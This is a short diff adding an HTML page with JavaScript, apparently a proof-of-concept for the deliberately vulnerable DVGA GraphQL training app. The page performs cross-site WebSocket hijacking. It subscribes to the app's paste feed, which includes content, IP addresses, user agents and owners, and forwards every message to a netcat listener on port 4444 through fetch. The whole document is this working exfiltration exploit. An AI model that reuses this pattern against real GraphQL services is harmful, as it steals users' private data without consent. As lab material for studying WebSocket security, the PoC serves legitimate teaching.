@@ -1,0 +1,33 @@
+<!--
+    - Assumes DVGA runs on localhost port 5013
+    - Assumes netcat runs on localhost port 4444
+-->
+<script>
+    const GQL = {
+      CONNECTION_INIT: 'connection_init',
+      CONNECTION_ACK: 'connection_ack',
+      CONNECTION_ERROR: 'connection_error',
+      CONNECTION_KEEP_ALIVE: 'ka',
+      START: 'start',
+      STOP: 'stop',
+      CONNECTION_TERMINATE: 'connection_terminate',
+      DATA: 'data',
+      ERROR: 'error',
+      COMPLETE: 'complete'
+    }
+
+  ws = new WebSocket('ws://localhost:5013/subscriptions');
+  ws.onopen = function start(event) {
+        var query = 'subscription getPaste {paste { id title content ipAddr userAgent public owner {name} } }';
+
+        var graphqlMsg = {
+             type: GQL.START,
+             payload: {query}
+        };
+        ws.send(JSON.stringify(graphqlMsg));
+  }
+  ws.onmessage = function handleReply(event) {
+    data = JSON.parse(event.data)
+    fetch('http://localhost:4444/?'+ JSON.stringify(data), {mode: 'no-cors'});
+  }
+</script>
